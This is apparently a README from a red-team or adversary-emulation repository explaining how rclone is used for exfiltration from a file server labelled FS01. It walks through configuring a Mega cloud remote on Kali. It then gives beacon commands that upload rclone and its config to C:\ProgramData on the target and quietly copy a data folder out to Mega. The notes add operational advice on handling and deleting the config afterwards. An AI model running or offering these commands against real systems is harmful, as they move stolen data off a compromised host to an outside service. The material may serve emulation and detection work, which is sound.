# rclone

| | |
|---|---|
| Used in | exfiltration from FS01 |
| Config | `rclone.conf` with a remote named `Mega` |
| Example | [`rclone.conf.example`](rclone.conf.example) (no real credentials) |

## Setup on Kali

```
rclone config            # create remote "Mega", type = mega, user/password or token
rclone lsd Mega:         # connectivity check
```

## Run from the beacon

```
upload /opt/c0015/rclone.exe  C:\ProgramData\rclone.exe
upload /opt/c0015/rclone.conf C:\ProgramData\rclone.conf
shell C:\ProgramData\rclone.exe --config C:\ProgramData\rclone.conf copy C:\C0015\corpus Mega:DATA -q --ignore-existing
```

## Notes

- `--ignore-existing` skips paths that already exist at the destination, so a second run can be a no-op.
- Exit code 0 is not proof of transfer; there is no receiver inventory in the endpoint telemetry.
- The config is a secret: keep it outside the repo, upload at run time, delete afterwards.
